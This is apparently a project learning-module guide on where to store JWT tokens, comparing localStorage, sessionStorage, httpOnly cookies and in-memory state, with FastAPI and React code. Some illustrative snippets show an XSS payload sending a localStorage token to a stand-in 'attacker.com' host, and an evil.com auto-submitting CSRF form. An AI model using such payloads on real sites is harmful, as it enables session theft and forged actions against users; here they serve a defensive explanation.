# Token Storage Deep Dive

## Table of Contents
- [Introduction](#introduction)
- [Storage Options Overview](#storage-options-overview)
- [localStorage](#localstorage)
  - [How It Works](#how-it-works)
  - [Security Considerations](#security-considerations)
  - [Implementation](#implementation)
- [sessionStorage](#sessionstorage)
  - [Differences from localStorage](#differences-from-localstorage)
  - [When to Use](#when-to-use)
- [httpOnly Cookies](#httponly-cookies)
  - [How They Work](#how-they-work)
  - [Why More Secure](#why-more-secure)
  - [Implementation Walkthrough](#implementation-walkthrough)
  - [CSRF Protection Required](#csrf-protection-required)
- [Memory (React State)](#memory-react-state)
  - [Maximum Security](#maximum-security)
  - [UX Tradeoffs](#ux-tradeoffs)
- [Provider Search Approach](#provider-search-approach)
  - [Current Implementation](#current-implementation)
  - [Why localStorage](#why-localstorage)
  - [Mitigations](#mitigations)
- [httpOnly Cookie Implementation](#httponly-cookie-implementation)
  - [Backend Changes](#backend-changes)
  - [Frontend Changes](#frontend-changes)
  - [CSRF Token Flow](#csrf-token-flow)
  - [Complete Example](#complete-example)
- [The Real-World Tradeoff](#the-real-world-tradeoff)
  - [Security vs Complexity](#security-vs-complexity)
  - [When to Migrate](#when-to-migrate)
- [Decision Matrix](#decision-matrix)
- [Code Examples: Both Approaches](#code-examples-both-approaches)
- [Summary](#summary)

---

## Introduction

**The question**: Where should you store JWT tokens?

**The debate**: This is one of the most contentious topics in web security. You'll find passionate arguments on both sides:

- **Team httpOnly Cookie**: "localStorage is insecure! XSS will steal your tokens!"
- **Team localStorage**: "Cookies require CSRF protection! Plus, httpOnly makes dev/debugging harder!"

**The reality**: Both approaches have tradeoffs. The "right" choice depends on:
- Your team size and expertise
- Your timeline and priorities
- Your threat model
- Your compliance requirements
- Your willingness to accept complexity for security

This guide will give you the full picture so you can make an informed decision.

---

## Storage Options Overview

| Storage | Accessible by JS | Persists After Close | Sent Automatically | XSS Vulnerable | CSRF Vulnerable |
|---------|------------------|----------------------|-------------------|----------------|-----------------|
| **localStorage** | ✅ Yes | ✅ Yes | ❌ No | ⚠️ Yes | ✅ No |
| **sessionStorage** | ✅ Yes | ❌ No | ❌ No | ⚠️ Yes | ✅ No |
| **httpOnly Cookie** | ❌ No | ✅ Yes | ✅ Yes | ✅ No | ⚠️ Yes (need protection) |
| **Memory (state)** | ⚠️ Only in scope | ❌ No | ❌ No | ⚠️ Only if leaked | ✅ No |

**Visual comparison**:
```
┌─────────────────────────────────────────────────────────────┐
│                      Browser Environment                    │
│                                                             │
│  ┌────────────────────┐  ┌────────────────────────────┐   │
│  │  JavaScript Scope  │  │    Cookie Store            │   │
│  │                    │  │                            │   │
│  │  • React state     │  │  • httpOnly cookies        │   │
│  │  • Variables       │  │    (JS cannot access)      │   │
│  │  • Memory          │  │                            │   │
│  │                    │  │  • Regular cookies         │   │
│  │  Can access:       │  │    (JS can access)         │   │
│  │  • localStorage    │  │                            │   │
│  │  • sessionStorage  │  └────────────────────────────┘   │
│  │  • DOM             │           ↓                        │
│  └────────────────────┘    Sent automatically             │
│           ↑                 with requests                  │
│      XSS can access                                        │
│       everything here                                      │
└─────────────────────────────────────────────────────────────┘
```

---

## localStorage

### How It Works

**localStorage** is a key-value store in the browser that:
- Persists across browser sessions (even after closing/reopening)
- Is specific to the origin (protocol + domain + port)
- Can store up to ~5-10MB of data
- Is synchronous (blocks the main thread)
- Is accessible from any JavaScript in the same origin

```javascript
// Set
localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...')

// Get
const token = localStorage.getItem('auth_token')

// Remove
localStorage.removeItem('auth_token')

// Clear all
localStorage.clear()

// Check existence
if (localStorage.getItem('auth_token')) {
  console.log('User is logged in')
}
```

**Where it's stored**:
```
Chrome: ~/Library/Application Support/Google/Chrome/Default/Local Storage/
Firefox: ~/Library/Application Support/Firefox/Profiles/[profile]/storage/default/
Safari: ~/Library/Safari/LocalStorage/
```

### Security Considerations

**Vulnerable to XSS**:
```javascript
// If an attacker injects this JavaScript (via XSS):
const token = localStorage.getItem('auth_token')
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
})

// The token is exfiltrated!
```

**Why this matters**:
- **One XSS vulnerability** anywhere in your app → all tokens stolen
- Stored tokens persist until explicitly cleared
- No browser-level protection against XSS

**Mitigation strategies**:
1. **Never use `dangerouslySetInnerHTML`** in React
2. **Validate all user input** before storing in DB
3. **Use Content Security Policy** headers
4. **Regular security audits** of dependencies
5. **Minimize attack surface** (fewer third-party scripts)

**NOT vulnerable to CSRF**:
```javascript
// This FAILS from evil.com:
const token = localStorage.getItem('auth_token')
// ↑ Returns null - can't access provider-search.com's localStorage!
```

### Implementation

**Store token after login**:
```javascript
// web/src/lib/auth.ts
export async function signIn(email: string, password: string) {
  const { data, error } = await supabase.auth.signInWithPassword({
    email,
    password
  })
  
  if (error) throw error
  
  // Supabase automatically stores session in localStorage:
  // Key: sb-<project-ref>-auth-token
  // Value: { access_token, refresh_token, ... }
  
  return data
}
```

**Use token in requests**:
```javascript
// web/src/lib/api.ts
export async function apiRequest(url: string, options: RequestInit = {}) {
  const { data: { session } } = await supabase.auth.getSession()
  
  const headers = {
    'Content-Type': 'application/json',
    ...options.headers
  }
  
  if (session?.access_token) {
    headers['Authorization'] = `Bearer ${session.access_token}`
  }
  
  const response = await fetch(url, {
    ...options,
    headers
  })
  
  if (response.status === 401) {
    // Token expired - Supabase auto-refreshes
    await supabase.auth.refreshSession()
    // Retry request...
  }
  
  return response.json()
}
```

**Clear token on logout**:
```javascript
export async function signOut() {
  await supabase.auth.signOut()
  // Supabase removes localStorage entry automatically
}
```

---

## sessionStorage

### Differences from localStorage

```javascript
// Same API as localStorage:
sessionStorage.setItem('temp_data', 'value')
const data = sessionStorage.getItem('temp_data')
sessionStorage.removeItem('temp_data')
```

**Key difference**: **Cleared when tab/window closes**

| Scenario | localStorage | sessionStorage |
|----------|--------------|----------------|
| Close tab | ✅ Persists | ❌ Cleared |
| Navigate to another site | ✅ Persists | ❌ Cleared (for that tab) |
| Open new tab | ✅ Shared | ❌ Separate (each tab isolated) |
| Refresh page | ✅ Persists | ✅ Persists |
| Close and reopen browser | ✅ Persists | ❌ Cleared |

### When to Use

**Use sessionStorage for**:
- Temporary auth (don't want persistent login)
- Multi-tab isolation (each tab has separate session)
- Shopping cart for current session
- Form data for current workflow

**Example**:
```javascript
// Banking app - require re-login after closing tab:
sessionStorage.setItem('bank_session_token', token)

// Multi-step form - persist data during workflow:
sessionStorage.setItem('application_draft', JSON.stringify(formData))
```

**Provider Search consideration**:
We use localStorage (not sessionStorage) because we want persistent login—users don't want to re-auth every time they open a new tab.

---

## httpOnly Cookies

### How They Work

**httpOnly cookies** are set by the server and **cannot be accessed by JavaScript**.

```python
# Server sets cookie:
response.set_cookie(
    key="session_token",
    value=token,
    httponly=True,     # ← JavaScript CANNOT access this
    secure=True,       # Only sent over HTTPS
    samesite="strict", # CSRF protection
    max_age=604800     # 7 days
)
```

**Browser automatically sends cookie with every request**:
```javascript
// Frontend - NO NEED to add Authorization header:
const response = await fetch('/api/profile', {
  credentials: 'include'  // ← Tells browser to send cookies
})

// Backend receives cookie automatically:
// Cookie: session_token=abc123...
```

**Visual flow**:
```
┌──────────────────────────────────────────────────────────────┐
│ 1. User logs in                                              │
│    POST /api/login { email, password }                       │
└──────────────────────────────────────────────────────────────┘
                         ↓
┌──────────────────────────────────────────────────────────────┐
│ 2. Server validates, creates token                           │
│    token = create_jwt(user_id=123)                           │
└──────────────────────────────────────────────────────────────┘
                         ↓
┌──────────────────────────────────────────────────────────────┐
│ 3. Server sets httpOnly cookie                               │
│    Set-Cookie: auth_token=<JWT>; HttpOnly; Secure; SameSite │
└──────────────────────────────────────────────────────────────┘
                         ↓
┌──────────────────────────────────────────────────────────────┐
│ 4. Browser stores cookie (JS cannot access!)                 │
│    document.cookie  → ""                                     │
│    localStorage     → empty                                  │
└──────────────────────────────────────────────────────────────┘
                         ↓
┌──────────────────────────────────────────────────────────────┐
│ 5. Browser automatically attaches cookie to requests         │
│    GET /api/profile                                          │
│    Cookie: auth_token=<JWT>                                  │
└──────────────────────────────────────────────────────────────┘
                         ↓
┌──────────────────────────────────────────────────────────────┐
│ 6. Server reads cookie, validates JWT                        │
│    token = request.cookies.get('auth_token')                 │
│    payload = jwt.decode(token, SECRET_KEY)                   │
│    user = get_user(payload['sub'])                           │
└──────────────────────────────────────────────────────────────┘
```

### Why More Secure

**XSS cannot steal the token**:
```javascript
// This returns NOTHING:
console.log(document.cookie)  // "" (httpOnly cookies are hidden)

// This FAILS:
const token = document.cookie  // Can't find httpOnly cookie
fetch('https://attacker.com/steal', { body: token })  // Sends ""
```

**Even if XSS exists**:
- Attacker can make requests (using victim's session)
- But attacker **cannot exfiltrate the token** to use elsewhere
- Limits damage to the current browser session
- Can't use token in Postman, curl, or other tools

**Real-world impact**:
```javascript
// ❌ With localStorage (XSS steals token):
const token = localStorage.getItem('auth_token')
fetch('https://attacker.com/steal', { body: token })
// → Attacker can now:
//   - Use token in Postman
//   - Log in from their machine
//   - Access API for days (until token expires)

// ✅ With httpOnly cookie (XSS limited):
fetch('/api/sensitive-action')  // Uses victim's cookie
// → Attacker can:
//   - Trigger actions in victim's browser
// → Attacker CANNOT:
//   - Steal the token
//   - Use it elsewhere
//   - Access API after victim closes browser
```

### Implementation Walkthrough

**Backend** (FastAPI):
```python
from fastapi import FastAPI, Response, Request, HTTPException, Depends
from jose import jwt, JWTError
from datetime import datetime, timedelta

app = FastAPI()

SECRET_KEY = os.getenv("JWT_SECRET_KEY")
ALGORITHM = "HS256"

def create_access_token(user_id: int):
    expire = datetime.utcnow() + timedelta(days=7)
    payload = {"sub": str(user_id), "exp": expire}
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

@app.post("/api/login")
async def login(credentials: LoginCredentials, response: Response):
    user = authenticate(credentials.email, credentials.password)
    if not user:
        raise HTTPException(401, "Invalid credentials")
    
    token = create_access_token(user.id)
    
    # Set httpOnly cookie
    response.set_cookie(
        key="auth_token",
        value=token,
        httponly=True,      # JS cannot access
        secure=True,        # HTTPS only (disable in dev: secure=False)
        samesite="strict",  # CSRF protection
        max_age=604800,     # 7 days
        path="/"            # Available to all routes
    )
    
    return {"message": "Logged in successfully"}

async def get_current_user(request: Request):
    token = request.cookies.get("auth_token")
    if not token:
        raise HTTPException(401, "Not authenticated")
    
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id = int(payload.get("sub"))
        user = get_user(user_id)
        if not user:
            raise HTTPException(401, "User not found")
        return user
    except JWTError:
        raise HTTPException(401, "Invalid token")

@app.get("/api/profile")
async def get_profile(user: User = Depends(get_current_user)):
    return user

@app.post("/api/logout")
async def logout(response: Response):
    response.delete_cookie("auth_token")
    return {"message": "Logged out"}
```

**Frontend** (React):
```javascript
// NO TOKEN STORAGE NEEDED!

async function login(email, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    credentials: 'include',  // ← Send cookies
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  
  if (response.ok) {
    // Cookie is set automatically!
    // No localStorage.setItem() needed
    return true
  }
  return false
}

async function getProfile() {
  const response = await fetch('/api/profile', {
    credentials: 'include'  // ← Send cookies
  })
  
  if (response.status === 401) {
    // Not authenticated
    window.location.href = '/login'
  }
  
  return response.json()
}

async function logout() {
  await fetch('/api/logout', {
    method: 'POST',
    credentials: 'include'
  })
  
  window.location.href = '/login'
}
```

### CSRF Protection Required

**Problem**: Browser sends cookies automatically, even for cross-site requests.

```html
<!-- On evil.com: -->
<form action="https://yourapp.com/api/delete-account" method="POST">
  <input type="hidden" name="confirm" value="true">
</form>
<script>
  document.forms[0].submit()  // Browser sends your cookie!
</script>
```

**Solution 1: SameSite cookies** (easiest):
```python
response.set_cookie(
    key="auth_token",
    value=token,
    samesite="strict"  # Don't send cookie on cross-site requests
)
```

**Solution 2: CSRF tokens** (if you need cross-origin):
```python
# Generate CSRF token on login:
csrf_token = secrets.token_urlsafe(32)
session['csrf_token'] = csrf_token

# Return to frontend:
return {"csrf_token": csrf_token}

# Validate on state-changing requests:
@app.post("/api/delete-account")
async def delete_account(
    request: Request,
    csrf_token: str = Header(..., alias="X-CSRF-Token")
):
    if csrf_token != request.session.get('csrf_token'):
        raise HTTPException(403, "Invalid CSRF token")
    # ... delete account
```

**Frontend**:
```javascript
// Store CSRF token in memory (not localStorage!):
let csrfToken = null

async function login(email, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  
  const data = await response.json()
  csrfToken = data.csrf_token  // Store in memory
}

async function deleteAccount() {
  await fetch('/api/delete-account', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'X-CSRF-Token': csrfToken  // Send on state-changing requests
    }
  })
}
```

---

## Memory (React State)

### Maximum Security

**Most secure option**: Never persist the token anywhere.

```javascript
function App() {
  const [authToken, setAuthToken] = useState(null)
  
  async function login(email, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    })
    
    const { access_token } = await response.json()
    setAuthToken(access_token)  // ← Stored in memory only
  }
  
  async function apiCall(url) {
    return fetch(url, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    })
  }
  
  // ... rest of app
}
```

**Why most secure**:
- XSS can only access the token **if it's in scope**
- Token disappears on page refresh
- Can't be extracted from browser storage
- Limits exposure window

### UX Tradeoffs

**The problem**: User must re-login on every page refresh.

```
User opens app → Login required
User refreshes page → Login required again
User opens new tab → Login required again
User's session expires → Must re-login immediately
```

**Workarounds**:
1. **Persist refresh token** in httpOnly cookie, access token in memory
2. **Short-lived sessions** with automatic refresh
3. **Accept the UX hit** for high-security scenarios

**When to use**:
- Banking apps
- Admin panels
- Healthcare applications (HIPAA)
- Anywhere security > convenience

---

## Provider Search Approach

### Current Implementation

**We use localStorage** with Supabase Auth.

**Code**:
```javascript
// web/src/lib/auth.ts
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_ANON_KEY
)

// Supabase automatically stores session in localStorage:
// Key: sb-<project>-auth-token
// Value: { access_token, refresh_token, expires_at, ... }

export async function signIn(email: string, password: string) {
  const { data, error } = await supabase.auth.signInWithPassword({
    email,
    password
  })
  return { data, error }
}

export async function getSession() {
  const { data: { session } } = await supabase.auth.getSession()
  return session
}

// Usage in API calls:
export async function apiRequest(url: string, options: RequestInit = {}) {
  const session = await getSession()
  
  if (session?.access_token) {
    options.headers = {
      ...options.headers,
      'Authorization': `Bearer ${session.access_token}`
    }
  }
  
  return fetch(url, options)
}
```

**Where token is stored**:
```bash
# Open Chrome DevTools → Application → Local Storage → http://localhost:5173
# Key: sb-<project-ref>-auth-token
# Value: {"access_token": "eyJ...", "refresh_token": "...", ...}
```

### Why localStorage

**Reasons we chose localStorage**:

1. **Speed**: Supabase uses localStorage by default—works out of the box
2. **Simplicity**: No backend cookie management, no CSRF tokens
3. **Mobile-friendly**: Planning a React Native app—localStorage pattern works
4. **Development velocity**: Solo developer, want to ship fast
5. **Acceptable risk**: Not handling PHI yet, React protects against XSS

**Tradeoffs we accepted**:
- ⚠️ Vulnerable to XSS (mitigated by avoiding `dangerouslySetInnerHTML`)
- ⚠️ Token visible in DevTools (acceptable for now)
- ⚠️ Can be stolen if any third-party script is compromised

### Mitigations

**What we do to reduce risk**:

1. **React's automatic escaping**:
```javascript
// ✅ SAFE - React escapes by default:
<div>{userInput}</div>

// ❌ NEVER USE:
<div dangerouslySetInnerHTML={{__html: userInput}} />
```

2. **Pydantic validation** on backend:
```python
from pydantic import BaseModel, validator

class ProviderCreate(BaseModel):
    name: str
    
    @validator('name')
    def no_html(cls, v):
        if '<' in v or '>' in v:
            raise ValueError('HTML not allowed')
        return v
```

3. **Regular dependency audits**:
```bash
npm audit
pip-audit
```

4. **Minimal third-party scripts**:
```javascript
// ❌ Don't add random analytics/tracking scripts
// ✅ Only use well-vetted libraries (React, Supabase, etc.)
```

5. **Future: Content Security Policy**:
```python
# TODO: Add CSP headers
response.headers["Content-Security-Policy"] = (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline' https://cdn.supabase.co; "
    # ...
)
```

---

## httpOnly Cookie Implementation

### Backend Changes

**Modify FastAPI backend** to use cookies instead of Authorization header:

```python
# api/app/auth.py
from fastapi import FastAPI, Response, Request, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from jose import jwt, JWTError
from datetime import datetime, timedelta
import os

app = FastAPI()

# IMPORTANT: Update CORS for credentials
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:5173",
        "https://provider-search.com"
    ],
    allow_credentials=True,  # ← Required for cookies
    allow_methods=["*"],
    allow_headers=["*"],
)

SECRET_KEY = os.getenv("JWT_SECRET_KEY")
ALGORITHM = "HS256"

def create_access_token(user_id: int):
    expire = datetime.utcnow() + timedelta(days=7)
    payload = {"sub": str(user_id), "exp": expire}
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

@app.post("/api/auth/login")
async def login(credentials: LoginCredentials, response: Response):
    # Validate with Supabase
    user = await validate_supabase_credentials(
        credentials.email,
        credentials.password
    )
    
    if not user:
        raise HTTPException(401, "Invalid credentials")
    
    # Create our own JWT (or use Supabase's)
    token = create_access_token(user.id)
    
    # Set httpOnly cookie
    response.set_cookie(
        key="auth_token",
        value=token,
        httponly=True,
        secure=os.getenv("ENVIRONMENT") == "production",  # HTTPS in prod
        samesite="strict",
        max_age=604800,  # 7 days
        path="/"
    )
    
    return {
        "message": "Logged in successfully",
        "user": {"id": user.id, "email": user.email}
    }

async def get_current_user(request: Request):
    token = request.cookies.get("auth_token")
    
    if not token:
        raise HTTPException(401, "Not authenticated")
    
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id = int(payload.get("sub"))
        
        # Look up user in your database
        user = get_user(user_id)
        if not user:
            raise HTTPException(401, "User not found")
        
        return user
    except JWTError:
        raise HTTPException(401, "Invalid token")

@app.get("/api/profile")
async def get_profile(user: User = Depends(get_current_user)):
    return {
        "id": user.id,
        "email": user.email,
        "name": user.name
    }

@app.post("/api/auth/logout")
async def logout(response: Response):
    response.delete_cookie("auth_token", path="/")
    return {"message": "Logged out successfully"}

@app.get("/api/auth/check")
async def check_auth(user: User = Depends(get_current_user)):
    """Endpoint to check if user is authenticated"""
    return {"authenticated": True, "user_id": user.id}
```

### Frontend Changes

**Update React to use credentials**:

```javascript
// web/src/lib/auth.ts
const API_BASE = import.meta.env.VITE_API_URL || 'http://localhost:8000'

export async function signIn(email: string, password: string) {
  const response = await fetch(`${API_BASE}/api/auth/login`, {
    method: 'POST',
    credentials: 'include',  // ← Send cookies
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  
  if (!response.ok) {
    const error = await response.json()
    throw new Error(error.detail || 'Login failed')
  }
  
  const data = await response.json()
  return data
}

export async function signOut() {
  await fetch(`${API_BASE}/api/auth/logout`, {
    method: 'POST',
    credentials: 'include'
  })
}

export async function checkAuth() {
  const response = await fetch(`${API_BASE}/api/auth/check`, {
    credentials: 'include'
  })
  
  if (!response.ok) {
    return null
  }
  
  return response.json()
}

// API request helper
export async function apiRequest(url: string, options: RequestInit = {}) {
  const response = await fetch(url, {
    ...options,
    credentials: 'include',  // ← Always send cookies
    headers: {
      'Content-Type': 'application/json',
      ...options.headers
    }
  })
  
  if (response.status === 401) {
    // Redirect to login
    window.location.href = '/login'
  }
  
  return response
}
```

**Update useAuth hook**:

```javascript
// web/src/hooks/useAuth.ts
import { createContext, useContext, useEffect, useState } from 'react'
import * as authClient from '../lib/auth'

interface AuthContextType {
  user: User | null
  loading: boolean
  signIn: (email: string, password: string) => Promise<void>
  signOut: () => Promise<void>
}

const AuthContext = createContext<AuthContextType | undefined>(undefined)

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null)
  const [loading, setLoading] = useState(true)
  
  useEffect(() => {
    // Check if user is authenticated on mount
    authClient.checkAuth()
      .then(data => setUser(data?.user || null))
      .catch(() => setUser(null))
      .finally(() => setLoading(false))
  }, [])
  
  const signIn = async (email: string, password: string) => {
    const data = await authClient.signIn(email, password)
    setUser(data.user)
  }
  
  const signOut = async () => {
    await authClient.signOut()
    setUser(null)
  }
  
  return (
    <AuthContext.Provider value={{ user, loading, signIn, signOut }}>
      {children}
    </AuthContext.Provider>
  )
}

export function useAuth() {
  const context = useContext(AuthContext)
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider')
  }
  return context
}
```

### CSRF Token Flow

**If you need cross-origin requests or SameSite=None**:

```python
# Backend
import secrets

csrf_tokens = {}  # In production, use Redis

@app.post("/api/auth/login")
async def login(credentials: LoginCredentials, response: Response):
    user = authenticate(credentials.email, credentials.password)
    
    # Create JWT
    token = create_access_token(user.id)
    
    # Create CSRF token
    csrf_token = secrets.token_urlsafe(32)
    csrf_tokens[user.id] = csrf_token
    
    # Set auth cookie
    response.set_cookie(
        key="auth_token",
        value=token,
        httponly=True,
        secure=True,
        samesite="none",  # Allows cross-origin
    )
    
    # Return CSRF token (frontend stores in memory)
    return {"csrf_token": csrf_token, "user": user}

@app.post("/api/providers")
async def create_provider(
    provider: ProviderCreate,
    csrf_token: str = Header(..., alias="X-CSRF-Token"),
    user: User = Depends(get_current_user)
):
    # Validate CSRF token
    if csrf_tokens.get(user.id) != csrf_token:
        raise HTTPException(403, "Invalid CSRF token")
    
    # ... create provider
```

**Frontend**:
```javascript
let csrfToken: string | null = null

export async function signIn(email: string, password: string) {
  const response = await fetch(`${API_BASE}/api/auth/login`, {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  })
  
  const data = await response.json()
  csrfToken = data.csrf_token  // Store in memory
  return data
}

export async function apiRequest(url: string, options: RequestInit = {}) {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    ...options.headers
  }
  
  // Add CSRF token to state-changing requests
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(options.method || 'GET')) {
    if (csrfToken) {
      headers['X-CSRF-Token'] = csrfToken
    }
  }
  
  return fetch(url, {
    ...options,
    credentials: 'include',
    headers
  })
}
```

### Complete Example

See `browser-tools/cookie-vs-localstorage-demo.html` for a working side-by-side comparison!

---

## The Real-World Tradeoff

### Security vs Complexity

```
┌────────────────────────────────────────────────────────────────┐
│                    Security vs Complexity                      │
│                                                                │
│  High Security                                                 │
│       ▲                                                        │
│       │  ┌─────────────┐                                      │
│       │  │ httpOnly    │                                      │
│       │  │ + CSRF      │                                      │
│       │  │ + Memory    │                                      │
│       │  └─────────────┘                                      │
│       │                                                        │
│       │         ┌──────────────┐                              │
│       │         │ httpOnly     │                              │
│       │         │ + SameSite   │                              │
│       │         └──────────────┘                              │
│       │                                                        │
│       │                  ┌──────────────┐                     │
│       │                  │ localStorage │  ← We are here      │
│       │                  │ + XSS        │                     │
│       │                  │   prevention │                     │
│       │                  └──────────────┘                     │
│       │                                                        │
│       │                           ┌────────────┐              │
│       │                           │ localStorage│              │
│       │                           │ (no         │              │
│       │                           │  protection)│              │
│  Low  └───────────────────────────┴────────────┴──────────▶   │
│                               Low          High                │
│                                                                │
│                            Complexity                          │
└────────────────────────────────────────────────────────────────┘
```

**The reality**:
- **localStorage + XSS prevention** = 80% security, 20% complexity
- **httpOnly cookies + SameSite** = 95% security, 40% complexity
- **httpOnly + CSRF tokens** = 98% security, 70% complexity
- **Memory (re-login)** = 99% security, 90% complexity (UX suffers)

### When to Migrate

**Stay with localStorage if**:
- Small team (<5 people)
- Early stage (MVP, seed funding)
- Not handling sensitive data (no PHI, no financial data)
- You have good XSS prevention (React, CSP, input validation)

**Migrate to httpOnly cookies if**:
- Raised Series A+ (resources for security engineer)
- Handling regulated data (HIPAA, PCI-DSS)
- Experienced XSS vulnerability
- Building for enterprise clients (security audits required)
- Team >10 engineers (can absorb complexity)

**Migration timeline**:
1. **Week 1**: Backend cookie implementation
2. **Week 2**: Frontend updates, CSRF protection
3. **Week 3**: Testing, session management edge cases
4. **Week 4**: Gradual rollout, monitoring

---

## Decision Matrix

| Scenario | Recommendation | Reasoning |
|----------|---------------|-----------|
| **Solo dev, MVP, < 1000 users** | localStorage | Speed to market, acceptable risk |
| **Small team, < 10k users, no PHI** | localStorage + CSP | Balance of security and complexity |
| **Series A+, healthcare/fintech** | httpOnly cookies | Compliance, audits, reputation risk |
| **Enterprise SaaS** | httpOnly cookies + CSRF | Required for SOC 2, ISO 27001 |
| **Banking/government** | Memory (re-login) | Maximum security, UX secondary |
| **Mobile app + web** | localStorage | httpOnly doesn't work well in mobile |
| **High XSS risk (user-generated HTML)** | httpOnly cookies | Can't trust XSS prevention alone |

---

## Code Examples: Both Approaches

### localStorage Approach

**Pros**: Simple, works everywhere, no CSRF protection needed
**Cons**: XSS can steal token

```javascript
// Login
const { access_token } = await fetch('/api/login', { ... }).then(r => r.json())
localStorage.setItem('auth_token', access_token)

// Use
const token = localStorage.getItem('auth_token')
fetch('/api/profile', {
  headers: { 'Authorization': `Bearer ${token}` }
})

// Logout
localStorage.removeItem('auth_token')
```

### httpOnly Cookie Approach

**Pros**: XSS can't steal token, browser handles storage
**Cons**: Need CSRF protection, more backend complexity

```python
# Backend
@app.post("/api/login")
async def login(response: Response):
    token = create_jwt(user_id)
    response.set_cookie(
        key="auth_token",
        value=token,
        httponly=True,
        secure=True,
        samesite="strict"
    )
    return {"message": "Logged in"}
```

```javascript
// Frontend
await fetch('/api/login', {
  method: 'POST',
  credentials: 'include'  // Send cookies
})

// Use (no token storage needed!)
fetch('/api/profile', {
  credentials: 'include'  // Cookies sent automatically
})

// Logout
await fetch('/api/logout', {
  method: 'POST',
  credentials: 'include'
})
```

---

## Summary

### Key Takeaways

1. **localStorage**:
   - ✅ Simple, no CSRF, mobile-friendly
   - ⚠️ XSS can steal tokens
   - 👉 Good for MVPs, small teams, non-sensitive data

2. **httpOnly cookies**:
   - ✅ XSS can't steal tokens
   - ⚠️ Need CSRF protection, more complex
   - 👉 Good for production, regulated industries, large teams

3. **sessionStorage**:
   - Same as localStorage but cleared on tab close
   - 👉 Good for temporary sessions (banking, admin panels)

4. **Memory (React state)**:
   - ✅ Most secure
   - ⚠️ User re-logs on refresh (bad UX)
   - 👉 Good for ultra-high-security scenarios

5. **Provider Search choice**:
   - Currently: localStorage (prioritizing speed)
   - Future: httpOnly cookies (when we scale/handle PHI)
   - Migration path: 3-4 weeks of work

### Next Steps

1. Read **[04-session-management.md](./04-session-management.md)** for token lifecycle
2. Try the browser tools:
   - `browser-tools/security-inspector.html`
   - `browser-tools/cookie-vs-localstorage-demo.html`
3. Review our auth implementation:
   - `web/src/lib/auth.ts`
   - `api/app/auth.py`
4. Run the Jupyter notebook: `notebooks/auth-deep-dive.ipynb`

### Resources

- **OWASP Token Storage**: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- **Web.dev on cookies**: https://web.dev/samesite-cookies-explained/
- **JWT.io**: https://jwt.io/
- **Supabase Auth Storage**: https://supabase.com/docs/guides/auth/sessions

---

*Part of the [Provider Search Security & Auth Learning Module](./00-overview.md)*
